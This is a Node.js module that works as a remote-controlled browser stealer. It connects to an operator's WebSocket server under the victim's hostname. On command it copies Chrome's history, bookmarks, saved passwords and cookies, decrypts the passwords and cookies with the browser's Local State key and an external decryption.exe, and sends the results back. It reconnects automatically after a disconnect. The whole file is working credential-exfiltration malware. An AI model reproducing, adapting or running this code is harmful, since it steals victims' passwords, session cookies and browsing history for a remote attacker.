/*
 * @Description: 
 * @Version: 1.0
 * @Autor: solid
 * @Date: 2022-11-03 17:21:06
 * @LastEditors: solid
 * @LastEditTime: 2022-11-09 17:44:23
 */
var { hostname, port, room, reconnectInterval } = require("../wsConfig/config.js")
const os = require('os');
const WebSocket = require('ws');
const fs = require("fs")
const path = require('path');
const sqlite3 = require('better-sqlite3');
const util = require('util');
const exec = util.promisify(require('child_process').exec);
var room = os.hostname();


function getDefaultProfile() {
    let data = process.env.LOCALAPPDATA;
    switch (os.platform()) {
        case "darwin":
            return path.join(data, "Google/Chrome/Default");
        case "win32":
            return path.join(data, "Google/Chrome/User Data/Default");
        case "linux":
            return path.join(data, "google-chrome/default");
    }
}
function GetHistory() {
    fs.writeFileSync("History", fs.readFileSync(path.join(getDefaultProfile(), "History")));
    fs.writeFileSync("Favicons", fs.readFileSync(path.join(getDefaultProfile(), "Favicons")));
    var hitoryDB = sqlite3("History")
    var faviconDB = sqlite3("Favicons")
    var items = []
    let sql = `select * from urls order by last_visit_time desc limit 50`;
    var rows = hitoryDB.prepare(sql).all()
    for (const row of rows) {
        items.push({ title: row.title, url: row.url })
    }
    items = items.map((item) => {
        sql = `select * from favicons JOIN icon_mapping on icon_mapping.icon_id = favicons.id and page_url = ?`;
        var row = faviconDB.prepare(sql).get(item.url)
        if (row) {
            item.ico = row.url
        }
        return item
    });
    hitoryDB.close()
    faviconDB.close()
    fs.unlinkSync("History")
    fs.unlinkSync("Favicons")
    return items
}
function getFolderChildren(rows) {
    var items = []
    for (const row of rows) {
        if (row.type == 'folder') {
            items.push({ name: row.name, url: row.url, type: row.type, children: getFolderChildren(row.children) })
        } else {
            items.push({ name: row.name, url: row.url, type: row.type })
        }
    }
    return items
}

function getBookmarksIco(rows, faviconDB) {
    return rows.map((item) => {
        if (item.type == "folder") {
            item.children = getBookmarksIco(item.children, faviconDB)
        }
        sql = `select * from favicons JOIN icon_mapping on icon_mapping.icon_id = favicons.id and page_url = ?`;
        var row = faviconDB.prepare(sql).get(item.url)
        if (row) {
            item.ico = row.url
        }
        return item
    });
}
function GetBookmarks() {
    fs.writeFileSync("Favicons", fs.readFileSync(path.join(getDefaultProfile(), "Favicons")));
    var faviconDB = sqlite3("Favicons")
    var rows = JSON.parse(fs.readFileSync(path.join(getDefaultProfile(), "Bookmarks"))).roots.bookmark_bar.children
    var items = getFolderChildren(rows)
    items = getBookmarksIco(items, faviconDB)
    faviconDB.close()
    fs.unlinkSync("Favicons")
    return items
}
async function generateJson(filename, filePath) {
    let data = process.env.LOCALAPPDATA;
    var getchromiumKeyPath
    switch (os.platform()) {
        case "darwin":
            getchromiumKeyPath = path.join(data, "Google/Chrome/Local State");
            break
        case "win32":
            getchromiumKeyPath = path.join(data, "Google/Chrome/User Data/Local State");
            break
        case "linux":
            getchromiumKeyPath = path.join(data, "google-chrome/Local State");
            break
    }
    fs.writeFileSync("chromiumKey", fs.readFileSync(getchromiumKeyPath));
    await exec(`decryption.exe  "${filePath}" "${filename}"`)
}
//获取加密信息  cookie和密码
async function GetDecrypeInfo(name) {
    switch (name) {
        case "cookie":
            var filePath = path.join(getDefaultProfile(), "Network\\Cookies")
            await generateJson(name, filePath)
            break;
        case "password":
            var filePath = path.join(getDefaultProfile(), "Login Data")
            await generateJson(name, filePath)
        default:
            break;
    }
    fs.unlinkSync("chromiumKey")
    fs.unlinkSync(name)
    var res = JSON.parse(fs.readFileSync(`result/${name}.json`))
    fs.unlinkSync(`result/${name}.json`)
    return res
}

function BrowserConnect(wsName) {
    var browserWs = new WebSocket(`ws://${hostname}:${port}/${wsName}?room=${room}_target`);
    browserWs.on('open', function () {
        console.log("Browser 连接成功");
    });
    browserWs.on("message", async (message) => {
        var data = JSON.parse(message)
        let res = ""
        switch (data.operation) {
            case "all":
                res = {
                    "history": GetHistory(),
                    "bookmarks": GetBookmarks(),
                    "password": await GetDecrypeInfo("password"),
                    "cookie": await GetDecrypeInfo("cookie"),
                }
                fs.writeFileSync("Favicons", fs.readFileSync(path.join(getDefaultProfile(), "Favicons")));
                var faviconDB = sqlite3("Favicons")
                res['password'] = res['password'].map((item) => {
                    sql = `select * from favicons JOIN icon_mapping on icon_mapping.icon_id = favicons.id and page_url = ?`;
                    var row = faviconDB.prepare(sql).get(item.url)
                    if (row) {
                        item.ico = row.url
                    }
                    return item
                })
                faviconDB.close()
                fs.unlinkSync("Favicons")
                break
            case "history":
                res = GetHistory()
                break;
            case "bookmarks":
                res = GetBookmarks()
                break
            case "password":
            case "cookie":
                res = await GetDecrypeInfo(data.operation)
                if (data.operation == "password") {
                    fs.writeFileSync("Favicons", fs.readFileSync(path.join(getDefaultProfile(), "Favicons")));
                    var faviconDB = sqlite3("Favicons")
                    res = res.map((item) => {
                        sql = `select * from favicons JOIN icon_mapping on icon_mapping.icon_id = favicons.id and page_url = ?`;
                        var row = faviconDB.prepare(sql).get(item.url)
                        if (row) {
                            item.ico = row.url
                        }
                        return item
                    })
                    faviconDB.close()
                    fs.unlinkSync("Favicons")
                }
                break
            default:
                res = "操作不存在"
                break;
        }
        browserWs.send(JSON.stringify({ operation: data.operation, data: res }))
    })
    browserWs.on('close', function () {
        console.log(' Browser 连接断开!!! Browser 等待重连');
        browserWs = null
        setTimeout(BrowserConnect, reconnectInterval)
    });
};
module.exports = BrowserConnect